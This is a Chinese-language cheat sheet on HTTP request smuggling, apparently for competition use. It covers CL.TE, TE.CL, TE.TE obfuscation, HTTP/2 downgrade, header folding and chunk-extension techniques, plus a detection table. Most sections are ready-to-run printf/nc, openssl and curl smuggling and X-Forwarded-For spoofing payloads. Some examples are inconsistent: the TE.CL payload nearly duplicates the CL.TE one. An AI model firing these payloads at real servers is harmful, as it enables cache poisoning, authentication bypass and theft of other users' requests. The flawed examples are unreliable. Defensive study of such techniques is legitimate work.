# 请求规范化与走私：代理与后端对同一请求的解析差异

> 被 `competition-request-normalization-smuggling` 引用。走私的本质是**两个解析器读了同一个
> 字节序列，得到不同结论**。所以第一件事永远是：**数清有几个解析器，谁跟前端说话、谁跟后端说话**。

## 一、先画解析器链路

```
client → [CDN/WAF] → [反向代理 nginx] → [应用网关/APIGW] → [app server] → [app framework]
            ①              ②                    ③                 ④              ⑤
```

每一跳都可能是"结论分歧点"。逐跳确认三件事：

| 问题 | 怎么确认 |
| --- | --- |
| 这一跳是转发还是终止？ | 看响应头 `Server`、`Via`、`X-Cache`；看 `Connection: keep-alive` 是否被改 |
| 这一跳用 HTTP/1.1 还是 HTTP/2？ | `curl -v --http2` 对比；看 ALPN 协商结果 |
| 这一跳对 body 长度怎么定？ | 发 `CL` 与 `TE` 冲突的请求，看返回与超时行为 |

```bash
# 逐跳探测：从外到内，看谁在改写什么
curl -sv https://target.example.com/ -o /dev/null 2>&1 | grep -iE 'server:|via:|x-|connection:'
```

```bash
# 判断是否有 CDN（DNS 指向 + 响应头特征）
dig +short target.example.com
curl -sI https://target.example.com/ | grep -iE 'cf-ray|akamai|x-served-by|x-cache|fastly|x-azure'
```

```bash
# 判断代理是否保留 CL+TE 冲突（最基础的走私探测）
# 发一个 TE: chunked + CL 同时存在的请求，看是否立即 400
printf 'POST / HTTP/1.1\r\nHost: target.example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | \
  openssl s_client -quiet -connect target.example.com:443 -servername target.example.com 2>/dev/null | head -20
```

## 二、CL / TE 冲突：五种组合

| 组合 | 谁赢（RFC 7230 规定 TE 优先） | 常见现实 |
| --- | --- | --- |
| `CL` + `TE: chunked` | 应忽略 CL，用 chunked | 很多代理用 CL，后端用 TE → **CL.TE** |
| `TE: chunked` + `CL` | 同上 | 顺序不影响 |
| 两个 `CL` | 应拒绝 | 有的用第一个，有的用最后一个 → **重复 CL** |
| `CL` + `TE: xchunked`（未知编码） | TE 不认识 → 400 | 有的忽略未知 TE 用 CL |
| `TE: chunked` + `TE: identity` | identity 优先 | 行为不一 |

### 2.1 CL.TE（前端用 CL，后端用 TE）

```bash
# 前端认为 body 长度 = 6（"0\r\n\r\n" 之外还多 6 字节），后端读到 0 就结束
# 剩下 6 字节被后端当成下一个请求
printf 'POST / HTTP/1.1\r\nHost: target.example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' | \
  nc target.example.com 80
```

### 2.2 TE.CL（前端用 TE，后端用 CL）

```bash
# 前端按 chunked 读到 0 结束；后端按 CL=6 只读 6 字节，剩下的留给下一个请求
printf 'POST / HTTP/1.1\r\nHost: target.example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | \
  nc target.example.com 80
```

### 2.3 TE.TE（两边都认 TE，但一边被混淆后忽略）

**这是最实用的变体**，因为现代代理基本都拒绝 CL+TE。做法是让**其中一个**解析器不认 TE：

```
Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding: chunked
Transfer-Encoding : chunked        ← 头名后有空格，部分解析器不认

Transfer-Encoding: chunked
Transfer-encoding: xchunked        ← 大小写变体 + 未知值

Transfer-Encoding: chunked
Transfer-Encoding:\tchunked        ← 用 tab

Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\n     ← 额外 CR

Transfer-Encoding: xchunked
Transfer-Encoding: chunked
```

```bash
# 批量试 TE 混淆（smuggler / smuggler.py 或手工）
cat > te_variants.txt <<'EOF'
Transfer-Encoding: chunked
Transfer-Encoding : chunked
Transfer-encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding: identity
Transfer-Encoding: chunked, identity
EOF
```

### 2.4 重复 CL

```bash
# 两个不同的 CL：前一个解析器用第一个，后一个用最后一个
printf 'POST / HTTP/1.1\r\nHost: target.example.com\r\nContent-Length: 6\r\nContent-Length: 0\r\n\r\n0\r\n\r\n' | nc target 80
```

### 2.5 检测方法（不触发副作用）

```bash
# 用 timing 判断：让后端等待 body，造成响应延迟
# CL.TE：前端立即转发，后端等 CL 字节 → 延迟
# 若延迟 5s 后超时，说明有一层在等 body
time (printf 'POST / HTTP/1.1\r\nHost: t.example.com\r\nContent-Length: 30\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n' | nc t.example.com 80)
```

**Burp 的 HTTP Request Smuggler 插件**是标准工具：`Detect` 模式用 timing 探测，
`Exploit` 模式构造实际攻击。手工只在前者失败时用。

## 三、HTTP/2 降级走私

HTTP/2 → HTTP/1.1 转换时，`content-length` / `transfer-encoding` 头会被**重新生成**，
若前端不校验两者一致性，就能注入。

| 变体 | 原理 |
| --- | --- |
| **H2.CL** | 在 H2 帧里带 `content-length: 0`，实际 body 有内容 → 后端用 CL=0，多余的成为下一个请求 |
| **H2.TE** | H2 里带 `transfer-encoding: chunked`（H2 明令禁止），代理转发到 H1 时保留该头 |
| **CRLF 注入到头值** | H2 头部值里含 `\r\n`，H1 化时变成新头 |
| **伪头滥用** | `:path` 里含空格/CRLF，或 `:method` 异常 |

```bash
# H2.CL 测试（需要支持 H2 的客户端，用 curl 的 --http2 + 手工头不能直接构造 body 不匹配）
# 推荐用 h2c 工具或 Burp 的 Repeater（切到 HTTP/2 模式后 hand-edit）
```

```bash
# 用 nghttp 构造 H2 请求（可精确控制头）
nghttp -H':method: POST' -H':path: /' -H':scheme: https' -H':authority: target.example.com' \
  -H'content-length: 0' -d /tmp/body.txt https://target.example.com/
```

```bash
# CRLF 注入到头值（H2→H1 转换时爆发）
# 在 Burp 里把 header 值改为:  x
#                            Transfer-Encoding: chunked
# 观察是否在 H1 侧出现新头
```

**判定 H2 降级是否发生**：

```bash
# 响应头里出现 H1 特有头，或 Connection 头被保留 → 后端看到的是 H1
curl -sI --http2 https://target.example.com/ | grep -iE 'connection|transfer-encoding'
```

## 四、头部折叠与其他规范化差异

| 差异点 | 表现 | 利用 |
| --- | --- | --- |
| **头部折叠**（obsolete line folding） | `X-Foo: a\r\n b` 被某些解析器拼成 `ab` | 绕过基于行首的规则 |
| **空格的容忍** | `Header : value` / `Header:\tvalue` | 前端不认该头 → 后端认 |
| **下划线 vs 连字符** | `X_Forwarded_For` vs `X-Forwarded-For` | nginx 默认丢弃含下划线的头 |
| **大小写** | H1 不敏感，但某些自定义实现敏感 | 绕过 header 黑名单 |
| **重复头** | 有的取第一个，有的取最后一个，有的拼逗号 | 绕过 `X-Forwarded-For` 白名单 |
| **路径规范化** | `//`、`/./`、`/../`、`%2e%2e` | 见 `runtime-routing` |
| **查询串编码** | `%3F` vs `?`、`+` vs `%20` | 参数走私 |
| **Content-Type 解析** | `application/json; charset=utf-8` vs 带引号 | 绕过 body 解析分支 |

```bash
# 头部折叠测试
printf 'GET / HTTP/1.1\r\nHost: t\r\nX-Test: a\r\n b\r\nConnection: close\r\n\r\n' | nc t 80

# 下划线头（nginx 默认丢弃）
curl -s -H 'X_Forwarded_For: 127.0.0.1' https://target/ -o /dev/null -w '%{http_code}\n'

# 重复 XFF
curl -s -H 'X-Forwarded-For: 1.1.1.1' -H 'X-Forwarded-For: 127.0.0.1' https://target/api/me
```

## 五、chunked 扩展（chunk extension）

```
5;ext=val\r\n
hello\r\n
0\r\n
\r\n
```

chunk extension 会被部分解析器忽略、部分解析器传给应用。若应用把它当数据 → 解析差异。

```bash
# 在 chunk 后加扩展
printf 'POST / HTTP/1.1\r\nHost: t\r\nTransfer-Encoding: chunked\r\n\r\n5;foo=bar\r\nhello\r\n0\r\n\r\n' | nc t 80

# trailer 头（chunked 的尾部）
printf 'POST / HTTP/1.1\r\nHost: t\r\nTransfer-Encoding: chunked\r\nTrailer: X-Sig\r\n\r\n0\r\nX-Sig: fake\r\n\r\n' | nc t 80
```

**trailer 走私**：若后端把 trailer 头合并进请求头，就能注入任意头（含 `Transfer-Encoding`、`X-Forwarded-For`）。

## 六、验伤：什么算真的走私成功

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| CL.TE 存在 | 第二个请求被后端当作独立请求处理（**在响应里看到第二个请求的响应**） | 只是超时；只是 400 |
| 前缀劫持 | 成功从后端拿到"下一个用户"的请求（含其 cookie/token） | 只看到自己请求的回显 |
| 缓存投毒 | 缓存里出现攻击者构造的响应，其他用户收到 | 只在自己会话里看到 |
| 绕过鉴权 | 走私的请求访问了需要认证的端点并拿到数据 | 走私的请求本身返回 401 |
| 请求隧道 | 后端连接被复用，能持续发请求 | 只成功一次 |

```bash
# 最小验证：走私一个到自己控制的端点的请求，看是否执行
# 例如：走私 GET /?smuggle=1，看后端日志里是否出现该请求（需有日志访问）
```

**核心判据**：**走私的请求必须被执行，且有可观测的证据**（响应差异、日志、副作用）。
只有"延迟"或"400/超时"不算。

## 七、检测视角

| 手法 | 日志/信号 | 特征 |
| --- | --- | --- |
| CL+TE 同时出现 | 代理/WAF 日志 | 同一请求同时含 `Content-Length` 与 `Transfer-Encoding` |
| TE 混淆 | 代理日志 | 头名含空格/tab；值非常见（`xchunked`/`identity`）；重复 TE |
| 重复 CL | 代理日志 | 同一请求多个 `Content-Length` 且值不同 |
| H2 降级 | 网关日志 | H2 请求含 `transfer-encoding`/`content-length` 且与帧长度不符 |
| 头部折叠 | WAF | 头部含单独的空白开头行 |
| 下划线头 | nginx 日志 | 被丢弃的 `X_*` 头（需开 `underscores_in_headers` 才能看到） |
| 响应时间异常 | 网关 | 单请求耗时远高于基线（timing 探测） |
| 请求数不符 | 后端访问日志 | 后端收到的请求数 > 前端记录的请求数 |

**最强的检测点**：**前后端请求计数对账**。走私一定导致后端看到的请求比前端多（或多出
非预期的路径）。这个指标很少被采集，但一旦采集，检出率接近 100%。

## 八、常见坑

1. **现代代理默认拒绝 CL+TE**——nginx 1.21+、HAProxy 2.x 都直接 400。要先确认版本，别一上来就打 CL.TE。
2. **timing 探测的假阳性**——后端慢响应、GC、网络抖动都会造成延迟。要多次测量取中位数，并与正常请求对比。
3. **只测 CL.TE 不测 TE.TE**——TE.TE 才是现代环境的主力，因为有 CL+TE 拒绝策略但 TE 混淆往往没防。
4. **走私成功后立刻重放**——连接是复用的，第二次请求可能落到另一个后端实例。要用同一连接连续发。
5. **HTTP/2 环境下用 H1 工具**——Burp 需要切到 HTTP/2 模式；curl 要 `--http2` 且不能直接构造非法帧，用 nghttp 或 h2c。
6. **忽略 `Connection: close`**——走私需要 keep-alive。如果你发的请求带 `Connection: close`，后端处理完就断，走私失效。
7. **在 HTTPS 上手写 nc**——`nc target 443` 是明文，会失败。用 `openssl s_client` 或 Burp。
8. **测完没恢复**——走私可能把后端连接搞坏，影响后续测试。换连接/等超时再继续。